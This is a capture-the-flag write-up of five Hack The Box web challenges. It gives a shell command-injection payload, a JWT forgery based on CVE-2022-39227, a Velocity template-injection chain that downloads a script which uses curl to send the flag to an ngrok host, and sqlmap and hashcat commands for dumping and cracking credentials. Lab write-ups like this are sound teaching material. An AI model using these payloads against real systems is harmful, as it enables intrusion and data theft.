# web

## Flag Command
> Solved by: Legend

Challenge description:

```
Embark on the "Dimensional Escape Quest" where you wake up in a mysterious forest maze that's not quite of this world. Navigate singing squirrels, mischievous nymphs, and grumpy wizards in a whimsical labyrinth that may lead to otherworldly surprises. Will you conquer the enchanted maze or find yourself lost in a different dimension of magical challenges? The journey unfolds in this mystical escape!
```

In this challenge the website is a game. After interacting with for a few minutes saw that it is running with `API` mostly. 
In burp I saw there was options which showed all the game command which can be used.


![](https://i.imgur.com/e13FyAu.png)


In that there was a `secret` command which seemed interesting.  Just gave that command as input and got the flag.

![](https://i.imgur.com/f3UdedV.png)

---

## TimeKORP
> Solved By : thewhiteh4t


- TimeModel.php is vulnerable

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```

- specifically :

```
$this->command = "date '+" . $format . "' 2>&1";
```

- we just need to match single quotes and insert cat command in between so payload becomes :

```bash
';cat /flag;'
```

![](https://i.imgur.com/BhQqnTJ.png)

---

## LockTalk
> Solved by : thewhiteh4t & Starry-lord

This challenge came with files and a docker instance.

![deny if /api/v1/get_ticket](https://i.imgur.com/BA10qeR.png)

We can see the haproxy configuration is set to deny access to the /api/v1/get_ticket endpoint, and that the requirements for this webpage to work is an outdated python_jwt 3.3.3 library.

![Enumeration!](https://i.imgur.com/NuH8e6b.png)

When we visit the webpage, we are greeted with 3 possible endpoints making everything pretty clear for our next step. but we can’t get a token when we try it because of haproxy. But when we send the request to BurpSuite’s repeater tab, and modify the path, we can actually get a ticket.

![bypass haproxy](https://i.imgur.com/lgQWfIy.png)

With our ticket we can now try the other 2 endpoints and read some exchanges between a fake ransomware group named `Openbit3.0` and some of their victims, as a reference to the recent Operation of the Cronos Taskforce related to the LockBit ransomware gang.

![ransom chats](https://i.imgur.com/hCVlziR.png)

So it was time to look into that old python json web token library, and sure enough, there was an exploit to be found. This CVE from 2022 allows to send and claims we want by exploiting the way the json web token is parsed.


> python-jwt is a module for generating and verifying JSON Web Tokens. Versions prior to 3.3.4 are subject to Authentication Bypass by Spoofing, resulting in identity spoofing, session hijacking or authentication bypass. An attacker who obtains a JWT can arbitrarily forge its contents without knowing the secret key. Depending on the application, this may for example enable the attacker to spoof other user's identities, hijack their sessions, or bypass authentication. Users should upgrade to version 3.3.4. **There are no known workarounds.**
> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-39227

What a nice thing to read as a pentester, “there are no known workarounds”.


https://github.com/user0x1337/CVE-2022-39227


With the help of the given files we can determine that `administrator` is the required role to bypass all restrictions on the page.


![roles: guest, administrator](https://i.imgur.com/wtfwDuS.png)


With this knowledge in hand, we can now use the github proof of concept, as shown below.


![claim we are admin](https://i.imgur.com/8ZDg6Tr.png)


With the valid token we retrieved, and the correct role name, we can now craft a payload and send it to the /api/v1/flag endpoint.


![](https://i.imgur.com/X6jWB1g.png)


```
HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}
```

---

## Labyrinth Linguist
> Solved by : thewhiteh4t


- In this challenge we have a translation service
- Upon inspecting source files, we noticed few things : 
    - flag file is partially randomized in `entrypoint.sh`

```
mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt
```

- In `pom.xml` we can see the dependencies and their version information :

```xml
<parent>
  <groupId>org.springframework.boot</groupId>
  <artifactId>spring-boot-starter-parent</artifactId>
  <version>1.5.10.RELEASE</version>
</parent>

<dependencies>
  <dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
  </dependency>
  <dependency>
    <groupId>org.apache.velocity</groupId>
    <artifactId>velocity</artifactId>
    <version>1.7</version>
  </dependency>
  <dependency>
    <groupId>org.apache.velocity</groupId>
    <artifactId>velocity</artifactId>
    <version>1.7</version>
  </dependency>
</dependencies>
```

- Velocity v1.7 is vulnerable to SSTI attack
- References
    - https://antgarsil.github.io/posts/velocity/
    - https://iwconnect.com/apache-velocity-server-side-template-injection/
- Based on the PoC above we ran the test case

```
#set ($run=1 + 1) $run
```

![](https://i.imgur.com/AltGQxG.png)

- RCE was blind because we had no output of the commands so we used `ngrok` for getting a callback to confirm if the payload was working
- Then we tried reverse shells but none of them worked for some reason so we thought to simplify we can make it download a file
- And since the command output was not visible we used web requests to exfiltrate the flag by setting custom user agent in curl command

```
> cat pwn

curl "https://f084-116-74-26-67.ngrok-free.app/special" -H "User-Agent: $(cat /flag*)"
```

![](https://i.imgur.com/8itLO2W.png)

- After sending the file we send a second request to run it using : `sh pwn`


![](https://i.imgur.com/sWeNay4.png)



- Web logs in ngrok dashboard :


![](https://i.imgur.com/o1yA2db.png)

---

## KORP Terminal
> Solved by : Legend, thewhiteh4t

- Challenge presents us with a login page
- Testing SQL injection shows that it is vulnerable

![](https://i.imgur.com/6LIGKIQ.png)

- POST request from burpsuite : 

```
    POST / HTTP/1.1
    Host: 94.237.58.148:47562
    Content-Length: 66
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Origin: http://94.237.58.148:47562
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.57 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Referer: http://94.237.58.148:47562
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-US,en;q=0.9
    Connection: close
    
    username=a&password=a
```

- SQLMap

```
> sqlmap -r post.txt --ignore-code 401
```

![](https://i.imgur.com/1zEpILb.png)


```
> sqlmap -r $PWD/post.txt --ignore-code 401 -T users -dump
```

![](https://i.imgur.com/WiTjnbb.png)

- This hash is crackable with hashcat

```
> hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
```

![](https://i.imgur.com/TSsdxz2.png)
